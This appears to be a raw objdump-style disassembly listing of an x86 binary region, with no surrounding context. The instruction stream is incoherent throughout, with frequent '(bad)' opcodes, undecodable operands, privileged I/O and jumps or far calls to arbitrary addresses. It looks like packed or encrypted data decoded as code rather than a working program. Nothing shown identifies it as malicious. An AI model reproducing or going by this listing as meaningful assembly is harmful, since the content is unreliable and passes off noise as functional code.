  413311:	lods   al,BYTE PTR ds:[esi]
  413312:	sbb    DWORD PTR [ebx],ebx
  413314:	sti    
  413315:	or     edi,esi
  413317:	lods   al,BYTE PTR ds:[esi]
  413318:	scas   eax,DWORD PTR es:[edi]
  413319:	in     eax,dx
  41331a:	popf   
  41331b:	inc    ebx
  41331c:	test   cl,bh
  41331e:	mov    ebx,0x96d79d14
  413323:	in     eax,0xa7
  413325:	xlat   BYTE PTR ds:[ebx]
  413326:	add    al,0xf1
  413328:	sbb    ah,ah
  41332a:	adc    DWORD PTR [ebp+0x5a],ecx
  41332d:	dec    esp
  41332e:	retf   0xc08e
  413331:	or     ch,BYTE PTR [edx+edx*8+0x5feb9cfa]
  413338:	pop    esp
  413339:	repnz enter 0x5a35,0xc2
  41333e:	out    0x49,al
  413340:	add    eax,0x64bee1c1
  413345:	jl     0x4133c0
  413347:	add    eax,ecx
  413349:	lea    esp,[ebp-0x4]
  41334c:	adc    cl,bl
  41334e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41334f:	jno    0x413381
  413351:	mov    edi,0x38892028
  413356:	sahf   
  413357:	mov    al,ds:0x4b6892a6
  41335c:	(bad)  
  41335d:	outs   dx,DWORD PTR ds:[esi]
  41335e:	and    eax,0xaa466e19
  413363:	mov    edi,0x3d86516c
  413368:	push   eax
  413369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336a:	(bad)  
  41336b:	shl    bh,0x73
  41336e:	mov    bh,0x45
  413370:	sahf   
  413371:	imul   ebp,DWORD PTR ds:0xf3b39b2b,0xffffffb0
  413378:	push   es
  413379:	sub    ecx,ecx
  41337b:	pop    ecx
  41337c:	xchg   DWORD PTR [edi+0x13b00f72],edi
  413382:	call   0x60156e45
  413387:	shl    ch,1
  413389:	fs retf 0x7ed
  41338d:	cmp    esp,DWORD PTR [ebp-0x322cedc0]
  413393:	pop    ss
  413394:	mov    edx,0x2ee638f1
  413399:	loopne 0x41333e
  41339b:	ret    0xa403
  41339e:	test   al,0x16
  4133a0:	retf   
  4133a1:	jne    0x413364
  4133a3:	push   ecx
  4133a4:	retf   
  4133a5:	jae    0x413400
  4133a7:	les    ecx,FWORD PTR [edx]
  4133a9:	adc    edi,ebp
  4133ab:	pusha  
  4133ac:	sbb    DWORD PTR [edi-0x2b],edi
  4133af:	dec    esp
  4133b0:	lods   eax,DWORD PTR gs:[esi]
  4133b2:	cld    
  4133b3:	inc    ebp
  4133b4:	rcl    DWORD PTR [ebp+0x74],1
  4133b7:	push   edi
  4133b8:	fsubr  QWORD PTR [eax+0xd]
  4133bb:	daa    
  4133bc:	shl    DWORD PTR [ecx],1
  4133be:	cli    
  4133bf:	dec    ebp
  4133c0:	mov    cl,0x9d
  4133c3:	test   BYTE PTR [eax],0x77
  4133c6:	mov    ch,0x10
  4133c8:	inc    ebx
  4133c9:	int3   
  4133ca:	(bad)  
  4133cb:	dec    esi
  4133cc:	jb     0x41335b
  4133ce:	loop   0x413390
  4133d0:	dec    esp
  4133d1:	adc    edi,DWORD PTR [edi-0x30624ae4]
  4133d7:	adc    BYTE PTR [eax-0x659477e2],bh
  4133dd:	shl    DWORD PTR [eax+esi*4],0x6c
  4133e1:	mov    al,ds:0x68a613c9
  4133e6:	ja     0x413391
  4133e8:	push   edi
  4133e9:	mov    bh,0x44
  4133eb:	rep stos BYTE PTR es:[edi],al
  4133ed:	dec    esp
  4133ee:	ja     0x4133f8
  4133f0:	sti    
  4133f1:	mov    edx,0x92b5db9b
  4133f6:	dec    esi
  4133f7:	add    ebp,DWORD PTR [edi+ecx*1+0x3aefb267]
  4133fe:	pop    ds
  4133ff:	mov    ebx,DWORD PTR [edx+0x60ccbefb]
  413405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413406:	cmp    al,0xba
  413408:	leave  
  413409:	ja     0x41341c
  41340b:	sbb    DWORD PTR [ecx-0x1c0d2582],esi
  413411:	push   edx
  413412:	jne    0x4133f8
  413414:	addr16 jo 0x413424
  413417:	or     BYTE PTR [ebx-0x70d10df4],cl
  41341d:	outs   dx,BYTE PTR ds:[esi]
  41341e:	add    dl,al
  413420:	jecxz  0x41344b
  413422:	outs   dx,DWORD PTR ds:[esi]
  413423:	stos   DWORD PTR es:[edi],eax
  413424:	xchg   DWORD PTR [ecx+0x41],ebp
  413427:	test   bl,ch
  413429:	pop    edx
  41342a:	sub    al,0x5b
  41342c:	push   ebp
  41342d:	mov    bh,0xc6
  41342f:	inc    esi
  413430:	das    
  413431:	aaa    
  413432:	mov    cl,0xd8
  413434:	lock inc esi
  413436:	add    ebp,DWORD PTR [ebx+0x18d4555a]
  41343c:	stc    
  41343d:	and    DWORD PTR [edx],0xbb420e0e
  413443:	cmp    al,0x34
  413445:	xchg   DWORD PTR [edx],esi
  413447:	adc    esi,edi
  413449:	outs   dx,BYTE PTR ds:[esi]
  41344a:	neg    BYTE PTR [esi-0x18b49cc1]
  413450:	repz jns 0x41346e
  413453:	cmp    edx,edi
  413455:	ins    DWORD PTR es:[edi],dx
  413456:	gs jl  0x4134ce
  413459:	push   esp
  41345a:	push   esi
  41345b:	(bad)  
  41345c:	sub    BYTE PTR [edi+0x221ad782],dl
  413462:	or     eax,0x4d3cec66
  413467:	and    BYTE PTR [edi+0x73fa820],cl
  41346d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41346e:	xor    al,0x63
  413470:	jge    0x4134cd
  413472:	mov    ebp,ecx
  413474:	jno    0x4134af
  413476:	dec    ebx
  413477:	mov    eax,0xdd306dee
  41347c:	mov    bl,0xbb
  41347e:	and    BYTE PTR [esi+0x35140e34],dl
  413484:	sub    esp,ecx
  413486:	mov    esp,edx
  413488:	and    al,0x1f
  41348a:	inc    edx
  41348b:	arpl   WORD PTR [eax],sp
  41348d:	pop    ebp
  41348e:	in     al,dx
  41348f:	(bad)  
  413491:	push   esp
  413492:	push   ss
  413493:	int    0x74
  413495:	and    dh,BYTE PTR [eax+0x7d]
  413498:	outs   dx,BYTE PTR ds:[esi]
  413499:	inc    esp
  41349a:	jp     0x41341d
  41349c:	and    edx,esp
  41349e:	sub    eax,0xcc8675f3
  4134a3:	sub    eax,0x506d5349
  4134a8:	or     DWORD PTR [ebp+eax*4+0x70c41c1b],edi
  4134af:	xor    dl,BYTE PTR [edi+esi*8-0x5d]
  4134b3:	dec    esp
  4134b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134b5:	mov    ah,0xd0
  4134b7:	arpl   di,bp
  4134b9:	mov    bh,0xfa
  4134bb:	xor    DWORD PTR [esi+0x4f],ecx
  4134be:	(bad)
  4134c1:	fwait
  4134c2:	and    al,0xe7
  4134c4:	cmp    al,0xc0
  4134c6:	add    DWORD PTR [edi-0x700ac55c],esp
  4134cc:	jmp    0x413484
  4134ce:	into   
  4134cf:	and    BYTE PTR [ebp+edi*4+0x44755470],bl
  4134d6:	dec    eax
  4134d7:	stos   BYTE PTR es:[edi],al
  4134d8:	cs (bad) 
  4134da:	out    0x0,al
  4134dc:	retf   
  4134dd:	mov    bl,0xb3
  4134df:	mov    edx,0x5aa5cce3
  4134e4:	out    dx,eax
  4134e5:	xor    ecx,edi
  4134e7:	daa    
  4134e8:	inc    ebx
  4134e9:	mov    ebp,edx
  4134eb:	mov    ds:0xf6a7556,al
  4134f0:	and    DWORD PTR [eax],esp
  4134f2:	test   BYTE PTR [esi-0x4f],0x86
  4134f6:	cmp    ch,BYTE PTR [edi]
  4134f8:	jle    0x4134ad
  4134fa:	pop    ss
  4134fb:	je     0x413530
  4134fd:	(bad)  
  4134fe:	in     eax,0x47
  413500:	jb     0x4134d5
  413502:	xchg   ebp,eax
  413503:	jmp    0x4134c7
  413505:	sub    eax,0x70c43835
  41350a:	es pop ss
  41350c:	and    BYTE PTR [eax],dl
  41350e:	add    ebx,edi
  413510:	sar    BYTE PTR [ecx],1
  413512:	std    
  413513:	nop
  413514:	pop    es
  413515:	pop    esp
  413516:	and    al,0x24
  413518:	lock pusha 
  41351a:	call   0x4faa43f4
  41351f:	sbb    bl,BYTE PTR [edi+ecx*2+0x68]
  413523:	add    al,0x32
  413525:	inc    ecx
  413526:	add    dh,BYTE PTR [edi+esi*1]
  413529:	mov    ds:0x41a077ff,al
  41352e:	add    al,0xa4
  413530:	xchg   esp,eax
  413531:	mov    cl,0x88
  413533:	aas    
  413534:	inc    esi
  413535:	xchg   esp,eax
  413536:	mov    ds:0x7b3dd6a1,al
  41353b:	mov    edi,DWORD PTR [edx]
  41353d:	dec    eax
  41353e:	mov    dl,0x2c
  413540:	out    0x2d,eax
  413542:	lahf   
  413543:	loopne 0x4134e5
  413545:	call   0x7017:0xf0c6d4e8
  41354c:	mov    ah,0x39
  41354e:	mov    edi,ebp
  413550:	(bad)  
  413551:	sub    al,0x92
  413553:	xor    bh,BYTE PTR [ebx+edx*1-0x7]
  413557:	pop    ecx
  413558:	cmp    dl,BYTE PTR [edx-0x20440313]
  41355e:	cmp    edi,ecx
  413560:	test   DWORD PTR [edx],edi
  413562:	xor    ebx,DWORD PTR [ebx+0x5ab1cb3d]
  413568:	xor    esp,DWORD PTR [edx]
  41356a:	stos   DWORD PTR es:[edi],eax
  41356b:	and    DWORD PTR [ebx+0x69ef932a],ebp
  413571:	adc    ch,BYTE PTR [edx-0x25]
  413574:	mov    cl,dh
  413576:	xchg   esp,eax
  413577:	xchg   edi,eax
  413578:	sbb    ah,BYTE PTR [ebx]
  41357a:	pushf  
  41357b:	lods   al,BYTE PTR ds:[esi]
  41357c:	pop    edi
  41357d:	call   FWORD PTR [ecx]
  41357f:	add    al,0xfb
  413582:	fsubr  QWORD PTR [edx-0x19]
  413585:	xor    eax,0x6e17b147
  41358a:	sub    al,0xe4
	...
  41375c:	call   0x7fb79f31
  413761:	idiv   ecx
  413763:	ficom  WORD PTR [ebp+0x2e]
  413766:	inc    esp
  413767:	and    al,0x7a
  413769:	inc    edi
  41376a:	xor    BYTE PTR [esi+0x1709e],0x25
  413771:	pop    es
  413772:	add    BYTE PTR [eax],al
  413774:	push   0x48ae422e
  413779:	mov    ebx,0xe6237df1
  41377e:	mov    ch,0x2d
  413780:	lods   al,BYTE PTR ds:[esi]
  413781:	ins    BYTE PTR es:[edi],dx
  413782:	xchg   BYTE PTR [eax+eiz*2-0x70b4c836],ch
  413789:	jmp    0x4137d1
  41378b:	push   cs
  41378c:	js     0x413766
  41378e:	cmp    BYTE PTR [edx-0x62],cl
  413791:	xchg   ebp,eax
  413792:	add    BYTE PTR [ecx+0x77],0xbd
  413796:	and    bl,dh
  413798:	rcr    esi,0x50
  41379b:	xor    al,0xfe
  41379d:	inc    ebx
  41379e:	sahf   
  41379f:	mov    esi,0xb363e38f
  4137a4:	stc    
  4137a5:	xchg   ebx,eax
  4137a6:	outs   dx,BYTE PTR ds:[esi]
  4137a7:	mov    al,ds:0x9a07987b
  4137ac:	xor    esp,edi
  4137ae:	ins    DWORD PTR es:[edi],dx
  4137af:	and    ch,BYTE PTR [ebp+0x266d64b]
  4137b5:	daa    
  4137b6:	cwde   
  4137b7:	les    edi,FWORD PTR [ebp+0x21]
  4137ba:	inc    eax
  4137bb:	jb     0x4137aa
  4137bd:	jp     0x41378d
  4137bf:	adc    dl,cl
  4137c1:	sti    
  4137c2:	xor    al,0x78
  4137c4:	ror    BYTE PTR ds:[ebx],0xbd
  4137c8:	daa    
  4137c9:	popa   
  4137ca:	add    bl,cl
  4137cc:	xor    al,0xc4
  4137ce:	xor    ebp,edi
  4137d0:	or     al,0x19
  4137d2:	push   ebp
  4137d3:	ret    
  4137d4:	cmc    
  4137d5:	inc    eax
  4137d6:	dec    ebx
  4137d7:	push   esi
  4137d8:	aas    
  4137d9:	pop    ecx
  4137da:	leave  
  4137db:	mov    ah,0x8d
  4137dd:	addr16 push esp
  4137df:	(bad)  
  4137e0:	and    ah,bl
  4137e2:	adc    DWORD PTR [ebx+0x3830eb18],ecx
  4137e8:	mov    WORD PTR [edi],?
  4137ea:	fsub   QWORD PTR [edi+0x3f8b7884]
  4137f0:	lods   al,BYTE PTR ds:[esi]
  4137f1:	pop    ds
  4137f2:	add    ah,BYTE PTR [ebx]
  4137f4:	sbb    eax,0x2004719
  4137f9:	or     al,al
  4137fb:	inc    ecx
  4137fc:	out    0xa9,al
  4137fe:	adc    BYTE PTR [edx],cl
  413800:	sub    eax,0x6ec769b4
  413805:	aaa    
  413806:	add    eax,0x56949574
  41380b:	sub    ecx,edx
  41380d:	push   0x90b37cf3
  413812:	loope  0x413803
  413814:	dec    edi
  413815:	sub    eax,0xf54757eb
  41381a:	and    DWORD PTR [edi-0x5b5d1897],ecx
  413820:	inc    esp
  413821:	jecxz  0x41385e
  413823:	mov    ecx,0x4e179f3b
  413828:	push   edi
  413829:	jg     0x41384d
  41382b:	dec    edi
  41382c:	jb     0x4137b6
  41382e:	mov    ah,0xc2
  413830:	leave  
  413831:	push   ds
  413832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413833:	push   edi
  413834:	les    ebp,FWORD PTR [esi+0x6c]
  413837:	stos   BYTE PTR es:[edi],al
  413838:	sbb    al,0x1b
  41383a:	leave  
  41383b:	dec    esp
  41383c:	push   edi
  41383d:	(bad)  
  41383e:	mov    esi,DWORD PTR [edx+0x1f]
  413841:	dec    esi
  413842:	xor    cl,BYTE PTR [edi-0x6a985a]
  413848:	cmp    ch,BYTE PTR [ebp+ebp*8-0x9]
  41384c:	leave  
  41384d:	ds inc ebx
  41384f:	sub    ecx,DWORD PTR [ebx-0x1143f22b]
  413855:	pop    es
  413856:	shr    BYTE PTR [ebp+0x4f918cfc],cl
  41385c:	push   edi
  41385d:	shl    BYTE PTR [edi-0x41],1
  413860:	aas    
  413861:	(bad)  
  413863:	dec    eax
  413864:	vmovhpd xmm3,xmm6,QWORD PTR [ecx-0x2c0fa29b]
  41386c:	inc    ebx
  41386d:	adc    BYTE PTR [esi+0x1f5bf1c2],0x51
  413874:	jmp    0x75fb:0xab32a45a
  41387b:	inc    eax
  41387c:	repz hlt 
  41387e:	inc    ebx
  41387f:	retf   0x6248
  413882:	ins    DWORD PTR es:[edi],dx
  413883:	pop    eax
  413884:	rcl    DWORD PTR [edx+0x1e6f37b1],1
  41388a:	adc    eax,DWORD PTR [eax+0x59e2d366]
  413890:	xor    bh,BYTE PTR [ebx+eiz*4]
  413893:	xchg   esi,eax
  413894:	jmp    0x6bb4a6cf
  413899:	dec    ebp
  41389a:	mov    bh,0x4c
  41389c:	jnp    0x413825
  41389e:	mov    ebx,0xafcf2b8e
  4138a3:	push   es
  4138a4:	rcr    DWORD PTR [esi-0x6fd9a335],cl
  4138aa:	jne    0x413888
  4138ac:	push   edi
  4138ad:	push   edx
  4138ae:	in     eax,0x3
  4138b0:	pop    edi
  4138b1:	jp     0x41389f
  4138b3:	pop    edx
  4138b4:	fistp  QWORD PTR [ebp-0x1b]
  4138b7:	pop    ebx
  4138b8:	sbb    al,0xfc
  4138ba:	xchg   BYTE PTR [edi-0x34303e89],bl
  4138c0:	add    eax,0xe3d251ee
  4138c5:	pop    ss
  4138c6:	and    DWORD PTR [edi+0x6e],ebp
  4138c9:	inc    esi
  4138ca:	inc    eax
  4138cb:	gs imul ecx,eax,0x8bba3933
  4138d2:	inc    ecx
  4138d3:	imul   BYTE PTR [esi]
  4138d5:	sbb    BYTE PTR [edi],al
  4138d7:	nop
  4138d8:	mov    dl,0x4c
  4138da:	stos   DWORD PTR es:[edi],eax
  4138db:	je     0x41394b
  4138dd:	sub    al,ch
  4138df:	xchg   dl,ch
  4138e1:	fnstsw WORD PTR [edi+eax*8+0x1e39b816]
  4138e8:	add    al,0x16
  4138ea:	retf   0xf360
  4138ed:	in     eax,0xf0
  4138ef:	fcmovnb st,st(3)
  4138f1:	shl    bh,1
  4138f3:	fnsave ds:0x4f649db5
  4138f9:	add    al,0x29
  4138fb:	ja     0x4138d5
  4138fd:	test   BYTE PTR [ebp+0x3e2f33b8],0x2c
  413904:	repnz rcl DWORD PTR [edx-0x6373a4f6],0x41
  41390c:	arpl   ax,bp
  41390e:	imul   esi,DWORD PTR [edi+0x48],0x4ff69966
  413915:	ret    0xf53
  413918:	ficomp DWORD PTR [ebx+eiz*8-0x65]
  41391c:	jmp    0x413962
  41391e:	or     DWORD PTR [edi],esp
  413920:	out    dx,al
  413921:	iret   
  413922:	sti    
  413923:	sbb    eax,0x71aab7a0
  413928:	outs   dx,DWORD PTR ds:[esi]
  413929:	inc    edi
  41392a:	jnp    0x4138c9
  41392c:	call   0xdb7e33c0
  413931:	xchg   edx,eax
  413932:	cmc    
  413933:	jle    0x4138cc
  413935:	pop    edx
  413936:	mov    ds:0x968facf9,al
  41393b:	cld    
  41393c:	and    BYTE PTR [eax],cl
  41393e:	scas   eax,DWORD PTR es:[edi]
  41393f:	(bad)  
  413940:	and    bh,BYTE PTR [edi+eiz*4]
  413943:	mov    al,0x32
  413945:	cmp    al,bl
  413947:	jo     0x4138f6
  413949:	mov    esp,0x890c17f4
  41394e:	out    0xcb,eax
  413950:	xchg   ebx,eax
  413951:	jo     0x4138f4
  413953:	push   ebx
  413954:	or     al,0x75
  413956:	int3   
  413957:	push   ebp
  413958:	cli    
  413959:	in     al,dx
  41395a:	inc    edi
  41395b:	and    dl,BYTE PTR [eax+ebp*8]
  41395e:	lds    eax,FWORD PTR [edx+esi*1]
  413961:	cmp    bh,ah
  413963:	shl    DWORD PTR [esi+edi*8-0x3c10acc9],1
  41396a:	aam    0x94
  41396c:	call   DWORD PTR [esi-0x2cc2cb39]
  413972:	sub    al,BYTE PTR [edx+ebx*4-0x4de87b0d]
  413979:	shl    DWORD PTR [ebp+0x4d28ed01],0xe7
  413980:	(bad)  
  413981:	out    dx,al
  413982:	test   cl,bh
  413984:	sti    
  413985:	(bad)  
  413986:	mov    dl,0x7e
  413988:	scas   eax,DWORD PTR es:[edi]
  413989:	xlat   BYTE PTR ds:[ebx]
  41398a:	jo     0x4139cc
  41398c:	xlat   BYTE PTR ds:[ebx]
  41398d:	sti    
  41398e:	shl    BYTE PTR [esp+eiz*2+0x50],1
  413992:	pop    ds
  413993:	add    BYTE PTR es:[ecx+0x2],ah
  413997:	sub    bh,ah
  413999:	leave  
  41399a:	xchg   DWORD PTR [ebx],esi
  41399c:	xchg   ebx,eax
  41399d:	xchg   ebx,eax
  41399e:	mov    bl,0x7f
  4139a0:	outs   dx,DWORD PTR ds:[esi]
  4139a1:	cmp    DWORD PTR [ecx+0x33ab1275],ecx
  4139a7:	fisttp QWORD PTR [ecx-0x5bc924e3]
  4139ad:	or     dl,BYTE PTR [esi+0x1546c7ff]
  4139b3:	scas   eax,DWORD PTR es:[edi]
  4139b4:	imul   ecx,eax,0x2f
  4139b7:	out    0x9b,al
  4139b9:	out    0xfb,eax
  4139bb:	(bad)  
  4139bc:	test   eax,0x8469a6bc
  4139c1:	adc    eax,0xd4a7adf0
  4139c6:	jnp    0x413a30
  4139c8:	xor    eax,0xfe14cd4a
  4139cd:	sub    al,0x5f
  4139cf:	test   BYTE PTR [edi-0x47e68b8d],0xbd
  4139d6:	aaa    
  4139d7:	or     al,0x40
  4139d9:	add    BYTE PTR [ebx-0x6c],0xa1
  4139dd:	sar    BYTE PTR [edx],cl
  4139df:	xchg   ebp,eax
  4139e0:	hlt    
  4139e1:	adc    bh,BYTE PTR [esi-0x5c]
  4139e4:	push   ss
  4139e5:	add    eax,0x57223ba7
  4139ea:	test   BYTE PTR [edi-0x51],0xb3
  4139ee:	pop    ds
  4139ef:	dec    eax
  4139f0:	fnstenv [edx+edx*1+0x6a]
  4139f4:	jp     0x4139f8
  4139f6:	xchg   ebp,eax
  4139f7:	aad    0x20
  4139f9:	test   eax,0xe34c466a
  4139fe:	cmp    BYTE PTR [edx+0x6],bl
  413a01:	or     esi,DWORD PTR [ebx]
  413a03:	mov    ebp,0x95e5ed2
  413a08:	fnsave [edx]
  413a0a:	dec    ebx
  413a0b:	lea    esi,[edi+ebx*8-0x22]
  413a0f:	jmp    0x27519f7d
  413a14:	mov    eax,ds:0x3c25fad0
  413a19:	cmp    eax,0xc3a30a13
  413a1e:	ins    DWORD PTR es:[edi],dx
  413a1f:	addr16 aam 0x69
  413a22:	jmp    0x568bb687
  413a27:	aaa    
  413a28:	leave  
  413a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a2a:	cmc    
  413a2b:	mov    ah,0xa2
  413a2d:	leave  
  413a2e:	pop    es
  413a2f:	ins    BYTE PTR es:[edi],dx
  413a30:	mov    esi,DWORD PTR ds:0x47f3a745
  413a36:	xor    dh,BYTE PTR [esi+0x5f5ee221]
  413a3c:	call   0x3d1c:0x5a923ada
  413a43:	lods   al,BYTE PTR ds:[esi]
  413a44:	ret    0x44ea
  413a47:	mov    ebp,0xa7b6865c
  413a4c:	jno    0x4139e1
  413a4e:	pop    es
  413a4f:	gs stc 
  413a51:	cld    
  413a52:	or     dl,BYTE PTR [ecx-0x4e]
  413a55:	retf   
  413a56:	adc    eax,0x8f2dff06
  413a5b:	jp     0x413ab1
  413a5d:	fld    QWORD PTR [ebx+0x75c51e33]
  413a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a64:	imul   esi,DWORD PTR [ecx],0x40
  413a67:	xor    al,0x3c
  413a69:	dec    esi
  413a6a:	daa    
  413a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a6c:	pusha  
  413a6d:	test   al,0x5f
  413a6f:	xor    eax,0x7723de7
  413a74:	inc    esp
  413a75:	jecxz  0x413a7c
  413a77:	mov    dh,0x22
  413a79:	ds fwait
  413a7b:	and    al,0x29
  413a7d:	inc    edi
  413a7e:	mov    eax,ds:0x8ad9d191
  413a83:	xor    eax,ecx
  413a85:	push   esp
  413a86:	mov    ?,WORD PTR [ebp+ebx*4-0x516fc5dc]
  413a8d:	loope  0x413aa5
  413a8f:	nop
  413a90:	sub    BYTE PTR [ebx-0x3a579bb3],bh
  413a96:	scas   al,BYTE PTR es:[edi]
  413a97:	icebp  
  413a98:	sahf   
  413a99:	inc    edx
  413a9a:	sub    bh,BYTE PTR [ecx]
  413a9c:	pop    ss
  413a9d:	scas   eax,DWORD PTR es:[edi]
  413a9e:	jb     0x413a6b
  413aa0:	sub    DWORD PTR [ebp-0x62d0161a],esi
  413aa6:	scas   eax,DWORD PTR es:[edi]
  413aa7:	pop    edx
  413aa8:	or     bl,al
  413aaa:	fnstenv [eax-0x5988362a]
  413ab0:	xchg   esi,eax
  413ab1:	cmp    BYTE PTR [ecx+0x6b83aff],0x17
  413ab8:	cmc    
  413ab9:	out    0xd2,al
  413abb:	sahf   
  413abc:	inc    eax
  413abd:	arpl   WORD PTR [ebx+ebp*2],bx
  413ac0:	ret    
  413ac1:	inc    edx
  413ac2:	mov    edi,gs
  413ac4:	or     DWORD PTR [ebp+0x66ff9e8c],0xf34cfddd
  413ace:	xchg   DWORD PTR [edi],edx
  413ad0:	sbb    DWORD PTR [eax+ecx*1-0x1b],esp
  413ad4:	div    ebp
  413ad6:	push   esp
  413ad7:	aad    0x61
  413ad9:	ins    DWORD PTR es:[edi],dx
  413ada:	dec    eax
  413adb:	push   esp
  413adc:	sar    ah,cl
  413ade:	hlt    
  413adf:	(bad)  
  413ae1:	sbb    esp,esi
  413ae3:	xchg   ebx,eax
  413ae4:	xchg   edi,eax
  413ae5:	push   ss
  413ae6:	mov    dl,0xff
  413ae8:	dec    edi
  413ae9:	call   0xadce:0x84ce958
  413af0:	sbb    al,0xdc
  413af2:	out    0xf6,eax
  413af4:	scas   al,BYTE PTR es:[edi]
  413af5:	fnsave [esi-0x13]
  413af8:	pop    edx
  413af9:	lahf   
  413afa:	dec    edi
  413afb:	sar    DWORD PTR [esi+0x3b31dab6],cl
  413b01:	push   esi
  413b02:	out    dx,eax
  413b03:	test   BYTE PTR [ebx-0x64e1d2a7],ah
  413b09:	outs   dx,DWORD PTR gs:[esi]
  413b0b:	and    ch,BYTE PTR [ebx-0x628de097]
  413b11:	mov    ah,0x38
  413b13:	pop    esi
  413b14:	pop    esi
  413b15:	in     eax,0xc1
  413b17:	dec    ebx
  413b18:	lahf   
  413b19:	cdq    
  413b1a:	jg     0x413ab1
  413b1c:	das    
  413b1d:	sbb    eax,0x77d34fb8
  413b22:	push   cs
  413b23:	shl    BYTE PTR [eax-0x4b0290dd],1
  413b29:	imul   esp,DWORD PTR [esi+eiz*1+0x6886d87d],0xdf0571d7
  413b34:	add    esi,ebp
  413b36:	and    ecx,edi
  413b38:	xor    eax,0xabec210f
  413b3d:	cmc    
  413b3e:	bound  eax,QWORD PTR [ebx]
  413b40:	repz arpl WORD PTR [esi-0x50ebc00f],si
  413b47:	pop    ebp
  413b48:	mov    ah,0x7f
  413b4a:	and    al,0x90
  413b4c:	pop    eax
  413b4d:	not    esi
  413b4f:	jnp    0x413b67
  413b51:	cld    
  413b52:	push   edx
  413b53:	nop
  413b54:	xor    al,0xe3
  413b56:	mov    ch,0x35
  413b58:	inc    edi
  413b59:	jno    0x413b9e
  413b5b:	call   DWORD PTR [edi+0x248fb291]
  413b61:	bound  ecx,QWORD PTR [ecx-0x70f97781]
  413b67:	and    al,0x47
  413b69:	sbb    edi,DWORD PTR [edx+0x19]
  413b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b6d:	jmp    DWORD PTR [edx]
  413b6f:	(bad)
  413b74:	cmp    DWORD PTR [edx],0xa19d5275
  413b7a:	mov    bh,0xfa
  413b7c:	popa   
  413b7d:	mov    ds:0x7d1dd97c,al
  413b82:	mov    esp,0x60c86957
  413b87:	jecxz  0x413b9b
  413b89:	popf   
  413b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b8b:	shl    DWORD PTR [edx],1
  413b8d:	cwde   
  413b8e:	outs   dx,DWORD PTR ds:[esi]
  413b8f:	cmp    DWORD PTR [edi-0xa954f83],edx
  413b95:	fsubr  DWORD PTR [esi-0x6929dd68]
  413b9b:	mov    DWORD PTR [edx],0xc41b2c16
  413ba1:	xchg   BYTE PTR [edx],ah
  413ba3:	inc    ebp
  413ba4:	sub    bl,BYTE PTR [ebp+esi*2+0x68a59c58]
  413bab:	lods   al,BYTE PTR ds:[esi]
  413bac:	repz inc ebp
  413bae:	jmp    0x5d0f3ba6
  413bb3:	xchg   ecx,eax
  413bb4:	pop    esi
  413bb5:	add    ecx,DWORD PTR [eax]
  413bb7:	sbb    ebx,DWORD PTR [edx-0x7a]
  413bba:	rol    DWORD PTR ds:0xbaa54635,1
  413bc0:	cmp    BYTE PTR [edx+0x44cc5cf8],bl
  413bc6:	mov    ds:0x5c64c1c7,eax
  413bcb:	ds adc dh,bl
  413bce:	mov    cs,WORD PTR [edi+0x2b397009]
  413bd4:	and    bh,BYTE PTR [edx+ebp*4+0x14]
  413bd8:	xchg   ebx,eax
  413bd9:	inc    eax
  413bda:	and    DWORD PTR [esi-0x7e6e63c4],eax
  413be0:	cmc    
  413be1:	xchg   ebp,eax
  413be2:	arpl   WORD PTR [edi+0x47ce7d26],bx
  413be8:	mov    esp,0x5828278a
  413bed:	cmp    ecx,DWORD PTR [ebx-0x4968447f]
  413bf3:	test   DWORD PTR [ebx],0xc41f2cd9
  413bf9:	enter  0x3b20,0x20
  413bfd:	mov    ch,bh
  413bff:	(bad)  [ebx]
  413c01:	mov    edi,0xa0e974be
  413c06:	mov    bl,0xbd
  413c08:	jl     0x413b98
  413c0a:	cmc    
  413c0b:	or     eax,0x2e5d9
  413c10:	call   0xe02f01ce
  413c15:	inc    ebp
  413c16:	ficom  DWORD PTR [edx]
  413c18:	xlat   BYTE PTR ds:[ebx]
  413c19:	aam    0xa2
  413c1b:	dec    ebp
  413c1c:	push   cs
  413c1d:	ins    BYTE PTR es:[edi],dx
  413c1e:	and    al,0xa0
  413c20:	ds sub eax,0x72ca3d7f
  413c26:	not    bh
  413c28:	pop    esi
  413c29:	mov    edi,0xacf23f9a
  413c2e:	sahf   
  413c2f:	xor    DWORD PTR [ecx-0x5182869d],eax
  413c35:	arpl   WORD PTR [edi-0x6a],bx
  413c38:	stos   DWORD PTR es:[edi],eax
  413c39:	adc    eax,0x465def6
  413c3e:	je     0x413c13
  413c40:	and    DWORD PTR [ecx+eax*4],edx
  413c43:	jae    0x413c3a
  413c45:	xor    DWORD PTR [bx+di],esp
  413c48:	jecxz  0x413bdb
  413c4a:	and    al,0x43
  413c4c:	stos   DWORD PTR es:[edi],eax
  413c4d:	push   esp
  413c4e:	es jne 0x413ca8
  413c51:	(bad)  
  413c52:	repz jl 0x413c41
  413c55:	dec    eax
  413c56:	mov    DWORD PTR [esi],0x2887e9dd
  413c5c:	or     esp,DWORD PTR [eax+ebp*1+0x50]
  413c60:	add    DWORD PTR ss:[esi+ecx*8+0x54],edi
  413c65:	inc    esi
  413c66:	icebp  
  413c67:	(bad)  
  413c69:	sub    BYTE PTR [ebp+ecx*2-0x69],bl
  413c6d:	sti    
  413c6e:	inc    esi
  413c6f:	mov    dh,0xfc
  413c71:	sahf   
  413c72:	mov    WORD PTR ds:0x6845c242,?
  413c78:	hlt    
  413c79:	(bad)  
  413c7b:	xor    DWORD PTR [eax-0x220c3855],0x6a
  413c82:	(bad)  
  413c83:	xor    BYTE PTR [ebx],cl
  413c85:	idiv   BYTE PTR [ecx+0xc]
  413c88:	inc    edx
  413c89:	mov    al,0x26
  413c8b:	in     al,dx
  413c8c:	add    al,0xa5
  413c8e:	lock xchg DWORD PTR [eax-0x44],ebp
  413c92:	mov    ah,0xa5
  413c94:	mov    DWORD PTR [ebx+0x3a],0xb3ccfc3e
  413c9b:	adc    BYTE PTR [ecx],cl
